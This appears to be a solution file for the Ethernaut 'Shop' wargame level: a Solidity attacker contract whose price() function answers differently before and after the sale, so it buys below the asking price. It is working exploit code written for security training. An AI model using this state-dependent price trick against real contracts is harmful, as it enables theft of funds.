// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Shop} from "../../src/ethernaut/21_Shop/Shop.sol";

contract Shop_Attacker {
	address player;
	Shop coreInst;
	
	uint256 oldPrice;
	
	constructor(Shop coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
		
		oldPrice = coreInst.price();
	}
	
	receive() external payable {}
	
	function doAttack() public {
		coreInst.buy();
	}
	
	function price() external view returns (uint256){
		if (!coreInst.isSold()) {
			return oldPrice + 1;
		} else {
			return oldPrice - 1;
		}
	}
}
